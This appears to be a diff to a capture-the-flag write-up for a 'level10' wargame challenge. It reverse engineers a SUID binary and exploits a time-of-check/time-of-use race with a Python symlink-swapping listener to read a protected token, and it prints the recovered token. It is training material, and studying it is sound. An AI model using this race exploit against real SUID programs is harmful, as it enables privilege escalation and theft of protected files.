@@ -1,3 +1,12 @@
+We find in the home folder a binary and a token file which is, almost sure, the target file to read:
+
+ls -al
+total 28
+...
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+
 We debug the binary with gdb and reverse engineer it
 
 We notice it reads the file passed from the first argument and sends it to the IP passed from the second argument over
@@ -60,4 +69,105 @@ Connecting to 127.0.0.1:6969 .. Connected!
 Sending file .. wrote file!
 
 It seems we can read only files that level10 has access to
+
+Running a strings command over the binary we realize that the binary is using `authorize` sys call before opening the file. The error string message "You don't have access to %" is also present
+
+We find running `strace` over the binary that the error message is being fired due to the authorize funtion returning -1 (Permission denied)
+
+strace ./level10 token 127.0.0.1
+...
+access("token", R_OK)                   = -1 EACCES (Permission denied)
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
+write(1, "You don't have access to token\n", 31You don't have access to token
+...
+
+Running against a properly owned file we confirm that `open` is run after `authorize`:
+
+strace ./level10 /etc/passwd 127.0.0.1
+...
+access("/etc/passwd", R_OK)             = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
+write(1, "Connecting to 127.0.0.1:6969 .. ", 32Connecting to 127.0.0.1:6969 .. ) = 32
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
+write(3, ".*( )*.\n", 8)                = 8
+write(1, "Connected!\n", 11Connected!
+)            = 11
+write(1, "Sending file .. ", 16Sending file .. )        = 16
+open("/etc/passwd", O_RDONLY)           = 4
+...
+
+
+Since the binary, `level10`, has SUID rights `open` syscall will inherit those permissions when running the binary and could read the target file token.
+So the `authorize` syscall is the one stopping us.
+
+We realize that we could trick `authorize` by passing a fake file created by us and swapping it with a symlink to the target before open is called.
+
+We modify our python script which will run a server on port 6969, creating an swapping the fake files:
+
+```python
+import socket
+import select
+import os
+
+
+FAKE_FILE = "/tmp/token"
+TARGET_FILE = "/home/user/level10/token"
+
+def create_fake_file():
+    if os.path.exists(FAKE_FILE):
+        os.remove(FAKE_FILE)
+    with open(FAKE_FILE, "w") as fake_file:
+	fake_file.write("This is a fake file.")
+
+def create_fake_sym_link():
+     if os.path.exists(FAKE_FILE):
+         os.remove(FAKE_FILE)
+     os.symlink(TARGET_FILE, FAKE_FILE)
+
+def main():
+    HOST, PORT = "0.0.0.0", 6969
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
+    server.listen(1)
+    print("Listening on 6969...")
+
+    while True:
+    	create_fake_file()
+        readable, _, _ = select.select([server], [], [])
+
+	if server in readable:
+	    print("Incoming connection requested!")
+            create_fake_sym_link()
+	    print("Fake symlink created.")
+            client_socket, client_address = server.accept()
+            print("Client conected:", client_address)
+            data = ""
+            while True:
+                buff = client_socket.recv(1024)
+                if not buff:
+                    break
+                data += buff
+            print("Received:", data)
+
+if __name__ == "__main__":
+    main()
+```
+
+Since the client binary starts opening the file as soon as the TCP handshake is finished, we'll sometimes receive the content of the fake file. So it's a matter of multiple executions until the race condition is met and the symlink gets created before the binary tries to open it:
+
+python /tmp/server.py
+
+Listening on 6969...
+Incoming connection requested!
+Fake symlink created.
+('Client conected:', ('127.0.0.1', 44972))
+('Received:', '.*( )*.\nThis is a fake file.')
+
+Incoming connection requested!
+Fake symlink created.
+('Client conected:', ('127.0.0.1', 44973))
+('Received:', '.*( )*.\nwoupa2yuojeeaaed06riuj63c\n')
 
